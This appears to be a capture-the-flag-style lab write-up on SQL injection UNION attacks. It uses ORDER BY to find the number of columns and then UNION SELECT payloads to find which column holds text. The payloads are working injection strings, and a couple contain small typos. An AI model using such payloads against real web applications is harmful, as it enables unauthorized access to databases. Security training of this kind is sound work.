## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234052779-081854cf-469c-41be-b3fa-df4097769882.png)

## Solution :

Query made - 
```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

**ORDER BY 4** return an error, means there are 3 columns being queried and retreived by the web application.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image](https://user-images.githubusercontent.com/67383098/234053894-e8d616b7-87bc-4dc0-92b7-fa1af1ea43fe.png)


#### Determine the column containng text data -

![image](https://user-images.githubusercontent.com/67383098/234054704-89d32e1a-909b-434f-a6e3-46975b9ba2ad.png)


We need to use the UNION SELECT payload  using 3 NULL values. Try thetring value *33eWHU* in one NULL value to see if it returns that string. If it does , then it means the column contains string data else it is not sting data.

**33eWHU in 1st NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT '3eWHU',NULL,NULL --
```

![image](https://user-images.githubusercontent.com/67383098/234055682-cf669cee-400a-466a-8892-7a64b10ee3a3.png)

**33eWHU in 2nd NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'33eWHU',NULL
```

![image](https://user-images.githubusercontent.com/67383098/234055016-49ef404e-457f-4e51-b9bf-b72e2b73872a.png)

![image](https://user-images.githubusercontent.com/67383098/234056709-ac749d4f-ac32-4df6-be18-4242a659d782.png)

![image](https://user-images.githubusercontent.com/67383098/234056775-01164b40-3359-4444-bdf8-4beb71aae69a.png)



